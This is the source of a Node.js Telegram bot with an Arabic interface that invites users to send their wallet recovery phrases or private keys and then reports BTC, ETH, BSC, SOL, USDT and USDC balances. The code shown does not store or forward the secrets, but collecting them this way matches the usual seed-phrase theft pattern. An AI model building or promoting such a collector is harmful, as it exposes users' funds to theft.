const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const { Keypair } = require('@solana/web3.js');
const bitcoin = require('bitcoinjs-lib');
const ecc = require('tiny-secp256k1');
const { BIP32Factory } = require('bip32');
const bs58 = require('bs58');
const wif = require('wif');

bitcoin.initEccLib(ecc);
const bip32 = BIP32Factory(ecc);

const TOKEN = process.env.BOT_TOKEN;
const PORT = Number(process.env.PORT || 3000);
const RENDER_URL = process.env.RENDER_URL;

if (!TOKEN) {
  console.error('BOT_TOKEN environment variable is required.');
  process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: false });
const app = express();

app.use(express.json({ limit: '64kb' }));

const ethProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://eth.llamarpc.com'), priority: 1, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://rpc.ankr.com/eth'), priority: 2, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://ethereum-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1200 }
], 1);

const bscProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org'), priority: 1, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://bsc-dataseed1.defibit.io'), priority: 2, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1200 }
], 1);

const SOLANA_RPCS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-rpc.publicnode.com',
  'https://rpc.ankr.com/solana'
];

const BTC_APIS = [
  'https://mempool.space/api/address/',
  'https://blockstream.info/api/address/'
];

const ERC20_ABI = ['function balanceOf(address owner) view returns (uint256)'];

const TOKENS = {
  ethUsdt: {
    contract: new ethers.Contract('0xdAC17F958D2ee523a2206206994597C13D831ec7', ERC20_ABI, ethProvider),
    decimals: 6
  },
  ethUsdc: {
    contract: new ethers.Contract('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', ERC20_ABI, ethProvider),
    decimals: 6
  },
  bscUsdt: {
    contract: new ethers.Contract('0x55d398326f99059ff775485246999027b3197955', ERC20_ABI, bscProvider),
    decimals: 18
  },
  bscUsdc: {
    contract: new ethers.Contract('0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', ERC20_ABI, bscProvider),
    decimals: 18
  }
};

const balanceCache = new Map();
const CACHE_TTL_MS = 30_000;

setInterval(() => {
  const now = Date.now();
  for (const [key, entry] of balanceCache.entries()) {
    if (entry.expiresAt <= now) {
      balanceCache.delete(key);
    }
  }
}, 60_000).unref();

const MAX_CONCURRENT_CHECKS = 25;
const MAX_QUEUE_SIZE = 100;
let activeChecks = 0;
const waitQueue = [];

function acquireSlot() {
  if (activeChecks < MAX_CONCURRENT_CHECKS) {
    activeChecks++;
    return Promise.resolve(true);
  }
  if (waitQueue.length >= MAX_QUEUE_SIZE) {
    return Promise.resolve(false);
  }
  return new Promise((resolve) => {
    waitQueue.push(() => resolve(true));
  });
}

function releaseSlot() {
  activeChecks = Math.max(0, activeChecks - 1);
  if (waitQueue.length > 0) {
    activeChecks++;
    const next = waitQueue.shift();
    next();
  }
}

function withTimeout(promise, ms = 3500, fallbackValue = null) {
  let timer;
  const timeoutPromise = new Promise((resolve) => {
    timer = setTimeout(() => resolve(fallbackValue), ms);
  });
  return Promise.race([promise, timeoutPromise]).finally(() => clearTimeout(timer));
}

function deriveBitcoinAddressesFromSeed(seedBuffer) {
  const network = bitcoin.networks.bitcoin;
  const root = bip32.fromSeed(seedBuffer, network);

  const legacyChild = root.derivePath("m/44'/0'/0'/0/0");
  const legacy = bitcoin.payments.p2pkh({ pubkey: legacyChild.publicKey, network }).address;

  const nestedChild = root.derivePath("m/49'/0'/0'/0/0");
  const nestedSegwit = bitcoin.payments.p2sh({
    redeem: bitcoin.payments.p2wpkh({ pubkey: nestedChild.publicKey, network }),
    network
  }).address;

  const nativeChild = root.derivePath("m/84'/0'/0'/0/0");
  const nativeSegwit = bitcoin.payments.p2wpkh({ pubkey: nativeChild.publicKey, network }).address;

  const taprootChild = root.derivePath("m/86'/0'/0'/0/0");
  const xOnlyPubkey = Buffer.from(taprootChild.publicKey.subarray(1, 33));
  const taproot = bitcoin.payments.p2tr({ internalPubkey: xOnlyPubkey, network }).address;

  return { legacy, nestedSegwit, nativeSegwit, taproot };
}

function deriveSolanaAddressFromSeed(seedBuffer) {
  const { key } = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
  const keypair = Keypair.fromSeed(key);
  return keypair.publicKey.toBase58();
}

function looksLikePrivateKeyCandidate(rawInput) {
  const trimmed = rawInput.trim();
  if (!trimmed || /\s/.test(trimmed)) return false;

  if (trimmed.startsWith('[') && trimmed.endsWith(']')) return true;
  if (/^(0x|0X)?[0-9a-fA-F]{40,70}$/.test(trimmed)) return true;
  if (/^[5KLc][1-9A-HJ-NP-Za-km-z]{45,60}$/.test(trimmed)) return true;
  if (/^[1-9A-HJ-NP-Za-km-z]{32,100}$/.test(trimmed)) return true;

  return false;
}

function parsePrivateKeyInput(rawInput) {
  const trimmed = rawInput.trim();

  if (trimmed.startsWith('[') && trimmed.endsWith(']')) {
    try {
      const arr = JSON.parse(trimmed);
      if (Array.isArray(arr) && arr.length === 64 && arr.every((n) => Number.isInteger(n) && n >= 0 && n <= 255)) {
        const kp = Keypair.fromSecretKey(Uint8Array.from(arr));
        return {
          type: 'solana',
          solAddress: kp.publicKey.toBase58(),
          cacheKey: `pk:sol:${kp.publicKey.toBase58()}`
        };
      }
    } catch (_) {
      return null;
    }
  }

  const hexCandidate = trimmed.startsWith('0x') || trimmed.startsWith('0X') ? trimmed.slice(2) : trimmed;
  if (/^[0-9a-fA-F]{64}$/.test(hexCandidate)) {
    try {
      const normalizedHex = `0x${hexCandidate.toLowerCase()}`;
      const evmWallet = new ethers.Wallet(normalizedHex);
      const privBuf = Buffer.from(hexCandidate, 'hex');
      const keyPair = bip32.fromPrivateKey(privBuf, Buffer.alloc(32), bitcoin.networks.bitcoin);
      const btcSegwit = bitcoin.payments.p2wpkh({
        pubkey: keyPair.publicKey,
        network: bitcoin.networks.bitcoin
      }).address;

      return {
        type: 'evm_btc_hex',
        evmAddress: evmWallet.address,
        btcAddresses: {
          legacy: null,
          nestedSegwit: null,
          nativeSegwit: btcSegwit,
          taproot: null
        },
        cacheKey: `pk:hex:${evmWallet.address}:${btcSegwit}`
      };
    } catch (_) {
      return null;
    }
  }

  if (/^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(trimmed)) {
    try {
      const decoded = wif.decode(trimmed);
      if (!decoded?.privateKey || decoded.privateKey.length !== 32) return null;
      const keyPair = bip32.fromPrivateKey(
        Buffer.from(decoded.privateKey),
        Buffer.alloc(32),
        bitcoin.networks.bitcoin
      );
      const btcSegwit = bitcoin.payments.p2wpkh({
        pubkey: keyPair.publicKey,
        network: bitcoin.networks.bitcoin
      }).address;

      return {
        type: 'bitcoin_wif',
        btcAddresses: {
          legacy: null,
          nestedSegwit: null,
          nativeSegwit: btcSegwit,
          taproot: null
        },
        cacheKey: `pk:wif:${btcSegwit}`
      };
    } catch (_) {
      return null;
    }
  }

  if (/^[1-9A-HJ-NP-Za-km-z]{60,95}$/.test(trimmed)) {
    try {
      const secretBytes = bs58.decode(trimmed);
      if (secretBytes.length === 64) {
        const kp = Keypair.fromSecretKey(secretBytes);
        return {
          type: 'solana',
          solAddress: kp.publicKey.toBase58(),
          cacheKey: `pk:sol:${kp.publicKey.toBase58()}`
        };
      }
    } catch (_) {
      return null;
    }
  }

  return null;
}

async function fetchSingleBtcAddressSatoshis(btcAddress) {
  for (const baseUrl of BTC_APIS) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 2200);
    try {
      const response = await fetch(`${baseUrl}${btcAddress}`, {
        method: 'GET',
        headers: { Accept: 'application/json' },
        signal: controller.signal
      });

      if (!response.ok) continue;

      const data = await response.json();
      const funded = BigInt(data?.chain_stats?.funded_txo_sum ?? 0);
      const spent = BigInt(data?.chain_stats?.spent_txo_sum ?? 0);
      const mempoolFunded = BigInt(data?.mempool_stats?.funded_txo_sum ?? 0);
      const mempoolSpent = BigInt(data?.mempool_stats?.spent_txo_sum ?? 0);

      const net = (funded - spent) + (mempoolFunded - mempoolSpent);
      return net > 0n ? net : 0n;
    } catch (_) {
      // الانتقال للمزود التالي عند الفشل أو انتهاء المهلة
    } finally {
      clearTimeout(timer);
    }
  }
  return 0n;
}

async function fetchCombinedBtcBalance(btcAddresses) {
  const addresses = [
    btcAddresses.legacy,
    btcAddresses.nestedSegwit,
    btcAddresses.nativeSegwit,
    btcAddresses.taproot
  ].filter(Boolean);

  if (addresses.length === 0) return '0';

  const satoshisList = await Promise.all(
    addresses.map((addr) =>
      withTimeout(fetchSingleBtcAddressSatoshis(addr), 3500, 0n)
        .then((v) => v ?? 0n)
        .catch(() => 0n)
    )
  );

  const totalSatoshis = satoshisList.reduce((acc, val) => acc + val, 0n);
  return ethers.formatUnits(totalSatoshis, 8);
}

async function fetchSolBalance(solAddress) {
  if (!solAddress) return 0;
  for (const rpcUrl of SOLANA_RPCS) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 2500);
    try {
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'getBalance',
          params: [solAddress, { commitment: 'confirmed' }]
        }),
        signal: controller.signal
      });

      if (!response.ok) continue;

      const data = await response.json();
      const lamports = data?.result?.value;
      if (typeof lamports === 'number' && Number.isFinite(lamports)) {
        return lamports / 1_000_000_000;
      }
    } catch (_) {
      // الانتقال للمزود التالي عند الفشل أو انتهاء المهلة
    } finally {
      clearTimeout(timer);
    }
  }
  return 0;
}

async function fetchErc20Formatted(tokenConfig, address) {
  if (!address) return '0.0';
  try {
    const raw = await withTimeout(tokenConfig.contract.balanceOf(address), 3500, 0n);
    return ethers.formatUnits(raw ?? 0n, tokenConfig.decimals);
  } catch (_) {
    return '0.0';
  }
}

async function fetchBalancesForTarget({ btcAddresses = null, evmAddress = null, solAddress = null }) {
  const [
    btcAmount,
    ethWei,
    bscWei,
    solAmount,
    ethUsdt,
    ethUsdc,
    bscUsdt,
    bscUsdc
  ] = await Promise.all([
    btcAddresses
      ? withTimeout(fetchCombinedBtcBalance(btcAddresses), 4500, '0').then((v) => v ?? '0').catch(() => '0')
      : Promise.resolve('0'),
    evmAddress
      ? withTimeout(ethProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n)
      : Promise.resolve(0n),
    evmAddress
      ? withTimeout(bscProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n)
      : Promise.resolve(0n),
    solAddress
      ? withTimeout(fetchSolBalance(solAddress), 4000, 0).then((v) => v ?? 0).catch(() => 0)
      : Promise.resolve(0),
    fetchErc20Formatted(TOKENS.ethUsdt, evmAddress),
    fetchErc20Formatted(TOKENS.ethUsdc, evmAddress),
    fetchErc20Formatted(TOKENS.bscUsdt, evmAddress),
    fetchErc20Formatted(TOKENS.bscUsdc, evmAddress)
  ]);

  return {
    btc: String(btcAmount),
    eth: ethers.formatEther(ethWei),
    bsc: ethers.formatEther(bscWei),
    sol: Number(solAmount),
    ethUsdt,
    ethUsdc,
    bscUsdt,
    bscUsdc
  };
}

function formatResultMessage({ btcAddresses = null, evmAddress = null, solAddress = null, balances }) {
  let addressesBlock = '';
  if (evmAddress) addressesBlock += `• EVM: ${evmAddress}\n`;
  if (solAddress) addressesBlock += `• SOL: ${solAddress}\n`;
  if (btcAddresses?.nativeSegwit) addressesBlock += `• BTC (Native SegWit): ${btcAddresses.nativeSegwit}\n`;
  if (btcAddresses?.taproot) addressesBlock += `• BTC (Taproot): ${btcAddresses.taproot}\n`;

  return (
    'تم فحص المحفظة بنجاح ✅\n\n' +
    (addressesBlock ? `📍 العناوين المشتقة:\n${addressesBlock}\n` : '') +
    '💰 الأرصدة والأصول المكتشفة:\n' +
    `• BTC: ${balances.btc}\n` +
    `• ETH: ${balances.eth}\n` +
    `• BNB (BSC): ${balances.bsc}\n` +
    `• SOL: ${balances.sol}\n` +
    `• USDT (ETH): ${balances.ethUsdt}\n` +
    `• USDC (ETH): ${balances.ethUsdc}\n` +
    `• USDT (BSC): ${balances.bscUsdt}\n` +
    `• USDC (BSC): ${balances.bscUsdc}\n\n` +
    '🟢 اكتمل الفحص'
  );
}

app.post(`/bot${TOKEN}`, (req, res) => {
  res.sendStatus(200);
  bot.processUpdate(req.body);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat?.id;
  const rawText = (msg.text || '').trim();
  if (!chatId || !rawText) return;

  if (rawText === '/start') {
    return bot.sendMessage(
      chatId,
      '🛡️ بوت فحص المحافظ المتطور\n\n' +
      'أرسل عبارة الاسترداد (12 أو 24 كلمة) أو المفتاح الخاص (Private Key بصيغة Hex أو WIF أو Base58) لفحص الأرصدة.',
      { reply_to_message_id: msg.message_id }
    );
  }

  const normalizedMnemonic = rawText.toLowerCase().replace(/\s+/g, ' ');
  const words = normalizedMnemonic.split(' ');
  const isMnemonicCandidate = words.length === 12 || words.length === 24;
  const pkInfo = isMnemonicCandidate ? null : parsePrivateKeyInput(rawText);
  const isInvalidPkCandidate = !isMnemonicCandidate && !pkInfo && looksLikePrivateKeyCandidate(rawText);

  if (isInvalidPkCandidate) {
    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
      reply_to_message_id: msg.message_id
    });
  }

  if (!isMnemonicCandidate && !pkInfo) {
    return;
  }

  bot.sendChatAction(chatId, 'typing').catch(() => {});

  if (isMnemonicCandidate && !bip39.validateMnemonic(normalizedMnemonic)) {
    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
      reply_to_message_id: msg.message_id
    });
  }

  const acquired = await acquireSlot();
  if (!acquired) {
    return bot.sendMessage(chatId, '⏳ الخادم مشغول حالياً بكثرة الطلبات، يرجى المحاولة بعد قليل.', {
      reply_to_message_id: msg.message_id
    });
  }

  try {
    let target = null;

    if (isMnemonicCandidate) {
      const seed = await bip39.mnemonicToSeed(normalizedMnemonic);
      const hdNode = ethers.HDNodeWallet.fromSeed(seed);
      const evmWallet = hdNode.derivePath("m/44'/60'/0'/0/0");
      const btcAddresses = deriveBitcoinAddressesFromSeed(seed);
      const solAddress = deriveSolanaAddressFromSeed(seed);

      target = {
        btcAddresses,
        evmAddress: evmWallet.address,
        solAddress,
        cacheKey: `mn:${btcAddresses.nativeSegwit}:${btcAddresses.taproot}:${evmWallet.address}:${solAddress}`
      };
    } else {
      target = pkInfo;
    }

    const cached = balanceCache.get(target.cacheKey);
    const balances = (cached && cached.expiresAt > Date.now())
      ? cached.data
      : await fetchBalancesForTarget(target);

    if (!cached || cached.expiresAt <= Date.now()) {
      balanceCache.set(target.cacheKey, {
        data: balances,
        expiresAt: Date.now() + CACHE_TTL_MS
      });
    }

    return bot.sendMessage(
      chatId,
      formatResultMessage({ ...target, balances }),
      { reply_to_message_id: msg.message_id }
    );
  } catch (error) {
    console.error('Check error:', error.message);
    return bot.sendMessage(chatId, '❌ تعذّر إتمام الفحص حالياً', {
      reply_to_message_id: msg.message_id
    });
  } finally {
    releaseSlot();
  }
});

app.get('/', (_req, res) => {
  res.status(200).send('OK');
});

const server = app.listen(PORT, async () => {
  console.log(`Server is running on port ${PORT}`);
  if (RENDER_URL) {
    try {
      await bot.setWebHook(`${RENDER_URL}/bot${TOKEN}`);
      console.log('Webhook configured');
    } catch (err) {
      console.error('Webhook setup failed:', err.message);
    }
  }
});

server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;
